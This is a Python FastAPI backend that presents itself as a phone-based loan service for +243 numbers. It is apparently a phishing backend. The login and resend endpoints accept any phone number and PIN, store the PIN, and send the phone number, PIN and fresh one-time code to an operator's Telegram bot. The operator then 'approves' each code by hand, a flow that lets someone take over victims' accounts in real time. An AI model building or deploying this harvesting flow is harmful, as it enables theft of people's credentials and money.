import json
import random
from uuid import uuid4
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import (
    send_approval_request,
    answer_callback_query,
    edit_message,
    send_loan_approval_request,
)
from approvals import (
    create_approval,
    set_approval_result,
    pending_approvals,
    approval_results,
    approval_phones,
    approval_pins,
    approval_otps,
    otp_approval_status,
    phone_pins,
    loan_request_status,
    loan_request_phones,
)
from notifications import send_otp_sms, send_telegram_message, build_otp_sms

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

init_db()

otp_store = {}


# --- Request Models ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str


class OTPRequest(BaseModel):
    phone_number: str
    otp: str


class RegisterRequest(BaseModel):
    phone_number: str
    pin: str


class ResendRequest(BaseModel):
    phone_number: str


def format_phone(phone: str) -> str:
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+243") and not phone.startswith("243"):
        return f"+243{phone}"
    if phone.startswith("243"):
        return f"+{phone}"
    return phone


def cleanup_approval_records_for_phone(phone: str):
    """Remove any stale approval entries tied to a phone number."""
    stale_ids = [aid for aid, p in approval_phones.items() if p == phone]
    for aid in stale_ids:
        approval_phones.pop(aid, None)
        approval_pins.pop(aid, None)
        approval_otps.pop(aid, None)
        approval_results.pop(aid, None)
        pending_approvals.pop(aid, None)


@app.get("/")
def read_root():
    return {"status": "Backend is running"}


@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN ---
@app.post("/api/login")
async def login(request: LoginRequest):
    full_phone = format_phone(request.phone_number)

    user = get_user(full_phone)
    if not user:
        create_user(full_phone, request.pin)

    cleanup_approval_records_for_phone(full_phone)

    otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = otp
    otp_approval_status[full_phone] = "pending"
    phone_pins[full_phone] = request.pin

    sms_body = build_otp_sms(otp)

    # ⭐ FIX: Call send_otp_sms DIRECTLY (not as a background task)
    # Render kills background tasks before they run, so we call it inline.
    send_otp_sms(full_phone, otp)

    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = request.pin
    approval_otps[approval_id] = otp

    await send_approval_request(approval_id, full_phone, request.pin, otp, sms_body)

    return {
        "status": "approved",
        "approval_id": approval_id,
        "message": "OTP sent to your phone"
    }


# --- APPROVAL STATUS (legacy) ---
@app.get("/api/approval-status/{approval_id}")
async def approval_status(approval_id: str):
    phone = approval_phones.get(approval_id)
    if phone is None:
        return {"status": "expired"}
    status = otp_approval_status.get(phone, "pending")
    return {"status": status}


# --- VERIFY OTP ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest):
    full_phone = format_phone(request.phone_number)
    expected = otp_store.get(full_phone)
    status = otp_approval_status.get(full_phone, "pending")

    if not expected or request.otp != expected:
        return {"status": "error", "message": "Code invalide"}

    if status == "rejected":
        otp_store.pop(full_phone, None)
        otp_approval_status.pop(full_phone, None)
        phone_pins.pop(full_phone, None)
        return {"status": "rejected", "message": "Code refusé par l'administrateur"}

    if status == "approved":
        otp_store.pop(full_phone, None)
        otp_approval_status.pop(full_phone, None)
        phone_pins.pop(full_phone, None)
        return {"status": "success", "message": "Prêt approuvé"}

    return {"status": "pending", "message": "En attente de validation"}


# --- OTP STATUS POLLING ---
@app.get("/api/otp-status/{phone_number}")
async def otp_status(phone_number: str):
    full_phone = format_phone(phone_number)
    if full_phone not in otp_approval_status:
        return {"status": "expired"}
    return {"status": otp_approval_status[full_phone]}


# --- RESEND OTP ---
@app.post("/api/resend-otp")
async def resend_otp(request: ResendRequest):
    full_phone = format_phone(request.phone_number)

    cleanup_approval_records_for_phone(full_phone)

    new_otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = new_otp
    otp_approval_status[full_phone] = "pending"

    pin = phone_pins.get(full_phone, "****")
    sms_body = build_otp_sms(new_otp)

    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = pin
    approval_otps[approval_id] = new_otp

    # ⭐ FIX: Call send_otp_sms DIRECTLY (not as a background task)
    send_otp_sms(full_phone, new_otp)

    await send_approval_request(approval_id, full_phone, pin, new_otp, sms_body)

    return {"status": "success", "message": "OTP resent successfully"}


# --- REQUEST LOAN ---
@app.post("/api/request-loan")
async def request_loan(request: ResendRequest):
    full_phone = format_phone(request.phone_number)

    approval_id = str(uuid4())
    loan_request_status[approval_id] = "pending"
    loan_request_phones[approval_id] = full_phone

    await send_loan_approval_request(approval_id, full_phone)

    return {
        "status": "pending",
        "approval_id": approval_id,
        "message": "Waiting for admin approval"
    }


# --- LOAN REQUEST STATUS ---
@app.get("/api/loan-request-status/{approval_id}")
async def loan_request_status_endpoint(approval_id: str):
    status = loan_request_status.get(approval_id, "expired")

    if status in ("approved", "rejected"):
        loan_request_status.pop(approval_id, None)
        loan_request_phones.pop(approval_id, None)

    return {"status": status}


# --- TELEGRAM WEBHOOK ---
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.body()
        if not body:
            print("Webhook called with empty body — ignoring")
            return {"ok": True}
        data = json.loads(body)
    except Exception as e:
        print(f"Webhook parse error: {e}")
        return {"ok": True}

    if "callback_query" not in data:
        print("Webhook received non-callback update — ignoring")
        return {"ok": True}

    try:
        callback = data["callback_query"]
        callback_id = callback["id"]
        callback_data = callback.get("data", "")

        # ─── LOAN APPROVAL BRANCH ──────────────────────────────
        if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
            action, approval_id = callback_data.split(":", 1)
            approved = (action == "loan_approve")

            loan_request_status[approval_id] = "approved" if approved else "rejected"

            await answer_callback_query(
                callback_id,
                "✅ Loan Approved" if approved else "❌ Loan Denied"
            )

            phone = loan_request_phones.get(approval_id, "Unknown")

            if "message" in callback:
                result_text = "✅ <b>Loan Approved</b>" if approved else "❌ <b>Loan Denied</b>"
                await edit_message(
                    chat_id=callback["message"]["chat"]["id"],
                    message_id=callback["message"]["message_id"],
                    text=f"{result_text}\n\n"
                         f"📱 Phone: <code>{phone}</code>\n"
                         f"🆔 Ref: <code>{approval_id}</code>"
                )

            return {"ok": True}

        # ─── OTP APPROVAL BRANCH ───────────────────────────────
        parts = callback_data.split(":")
        if len(parts) < 2:
            return {"ok": True}

        action = parts[0]
        approval_id = parts[1]
        approved = (action == "approve")

        set_approval_result(approval_id, approved)

        await answer_callback_query(
            callback_id,
            "✅ OTP Approved" if approved else "❌ OTP Rejected"
        )

        phone = approval_phones.get(approval_id, "Unknown")
        pin = approval_pins.get(approval_id, "Unknown")
        otp = approval_otps.get(approval_id, "Unknown")

        if phone != "Unknown":
            if approved:
                otp_approval_status[phone] = "approved"
                background_tasks.add_task(
                    send_telegram_message,
                    f"✅ <b>OTP Approved</b>\n"
                    f"📱 Phone: <code>{phone}</code>"
                )
            else:
                otp_approval_status[phone] = "rejected"
                otp_store.pop(phone, None)
                background_tasks.add_task(
                    send_telegram_message,
                    f"❌ <b>OTP Rejected</b>\n"
                    f"📱 Phone: <code>{phone}</code>"
                )

        if "message" in callback:
            result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
            await edit_message(
                chat_id=callback["message"]["chat"]["id"],
                message_id=callback["message"]["message_id"],
                text=f"{result_text}\n\n"
                     f"📱 Phone: <code>{phone}</code>\n"
                     f"🔑 PIN: <code>{pin}</code>\n"
                     f"🔐 OTP: <code>{otp}</code>\n"
                     f"🆔 Ref: <code>{approval_id}</code>"
            )

        approval_phones.pop(approval_id, None)
        approval_pins.pop(approval_id, None)
        approval_otps.pop(approval_id, None)

        return {"ok": True}

    except Exception as e:
        print(f"Webhook processing error: {e}")
        return {"ok": True}